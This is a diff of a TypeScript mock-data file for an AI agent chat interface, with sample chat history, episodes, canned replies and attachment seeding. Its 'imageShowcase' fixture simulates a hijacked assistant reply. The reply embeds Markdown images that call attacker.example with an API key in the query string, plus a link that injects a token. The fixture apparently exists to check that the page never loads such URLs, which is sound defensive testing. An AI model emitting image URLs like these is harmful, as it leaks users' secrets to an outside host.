@@ -3,16 +3,9 @@ import type { MockClock } from "../env";
 import { mockAttachment, storeAttachment } from "../inbox";
 import type { MockState } from "../state";
 
-// Recent live messages — span today, yesterday, and the day before so the
-// frontend inserts a day divider between each run. These correspond to the
-// contents of recent_messages.json on the backend.
 export function sampleRecentMessages(clock: MockClock): RecentMessage[] {
-  // A given number of calendar days before now at a specific hour, so the
-  // messages exercise the day-divider logic in the frontend feed store.
   const daysAgoAt = clock.dayAt;
   return [
-    // Main's reply to the relay that closes ep-003: the turn began in that
-    // episode, so it's shown once the episode loads.
     {
       role: "assistant",
       content: "Noted. The observer notes are in; I'll fold them into the memory doc.",
@@ -83,7 +76,6 @@ export function sampleRecentMessages(clock: MockClock): RecentMessage[] {
         "Good. Let's keep iterating on the notification routing doc.\n" +
         "[Attachment: routing-notes.md (1840 bytes) → inbox/agent/attachments/mock-chat-notes/routing-notes.md]\n" +
         "[Attachment: routing-spec.pdf (48213 bytes) → inbox/agent/attachments/mock-chat-spec/routing-spec.pdf]",
-      // A 1×1 PNG, the picture the message carried.
       images: [
         {
           media_type: "image/png",
@@ -119,7 +111,6 @@ export function sampleRecentMessages(clock: MockClock): RecentMessage[] {
       timestamp: daysAgoAt(0, 10, 6),
       visibility: "user",
     },
-    // The owner pasting an agent header by hand: stays their own message.
     {
       role: "user",
       content:
@@ -128,7 +119,6 @@ export function sampleRecentMessages(clock: MockClock): RecentMessage[] {
       timestamp: daysAgoAt(0, 10, 10),
       visibility: "user",
     },
-    // Background noise from before sessions existed: stays hidden.
     {
       role: "user",
       content: "Pulse check: inbox_check. Review the inbox for anything urgent.",
@@ -141,7 +131,6 @@ export function sampleRecentMessages(clock: MockClock): RecentMessage[] {
       timestamp: daysAgoAt(0, 10, 30),
       visibility: "background",
     },
-    // A spawned session's relayed result and main's reply: shown.
     {
       role: "user",
       content:
@@ -167,12 +156,8 @@ export function sampleRecentMessages(clock: MockClock): RecentMessage[] {
   ];
 }
 
-// Sample episodes — older compressed history that the frontend fetches
-// lazily as the user scrolls to the top. The cursor chain is
-// ep-003 → ep-002 → ep-001 → null.
 export interface SampleEpisode {
   id: string;
-  /** YYYY-MM-DD */
   date: string;
   messages: RecentMessage[];
 }
@@ -202,8 +187,6 @@ export function sampleEpisodes(clock: MockClock): SampleEpisode[] {
           timestamp: `${isoDateDaysAgo(3)}T00:00:00.000Z`,
           visibility: "user",
         },
-        // Episodes don't record visibility; the structured sender marks this
-        // as a session's message. Main's reply opens the recent segment.
         {
           role: "user",
           content:
@@ -268,7 +251,6 @@ export function sampleEpisodes(clock: MockClock): SampleEpisode[] {
   ];
 }
 
-/** The replies a chat turn cycles through, in order. */
 export const cannedResponses: readonly string[] = [
   "I've looked into that and here's what I found:\n\n" +
     "## Key Points\n\n" +
@@ -298,14 +280,8 @@ export const cannedResponses: readonly string[] = [
     "Let me know if you'd like a deeper dive into any specific area.",
 ];
 
-/** The host the image showcase's remote images name, which the page must never request. */
 export const IMAGE_SHOWCASE_REMOTE_HOST = "attacker.example";
 
-/**
- * The reply to a message starting with "images": a reply steered into
- * carrying what it knows out in image URLs, as Markdown and as raw HTML, beside
- * an image the page may show (a `data:` URI) and one that names a hub route.
- */
 export const imageShowcase: string =
   "# Image check\n\n" +
   `![tracker](https://${IMAGE_SHOWCASE_REMOTE_HOST}/pixel.png?d=the-api-key)\n\n` +
@@ -313,11 +289,6 @@ export const imageShowcase: string =
   "![sign in](/cloud/callback?token=attacker)\n\n" +
   "![dot](data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==)";
 
-/**
- * The reply to a message starting with "markdown": every Markdown shape a
- * reply can take that the page has to fit, with a table too wide for a phone
- * and a code line too long for any screen.
- */
 export const markdownShowcase: string =
   "# Rollout notes\n\n" +
   "Three channels are live, and the **fallback order** is set. Docs are at " +
@@ -342,7 +313,6 @@ export const markdownShowcase: string =
   "### Open questions\n\n" +
   "Should parked notifications expire after a week, or stay until someone reads them?";
 
-/** The text of the seeded `routing-notes.md`, which the history message's first attachment names. */
 const ROUTING_NOTES = [
   "# Routing notes",
   "",
@@ -352,11 +322,6 @@ const ROUTING_NOTES = [
   "",
 ].join("\n");
 
-/**
- * The companion inbox items the seeded history message's attachments are
- * saved in, as the backend saves a chat attachment: the agent can serve them,
- * and a `.md` one is a workspace file the Files panel opens.
- */
 export function seedChatAttachments(state: MockState): void {
   const { clock } = state.env;
   const notes = storeAttachment(
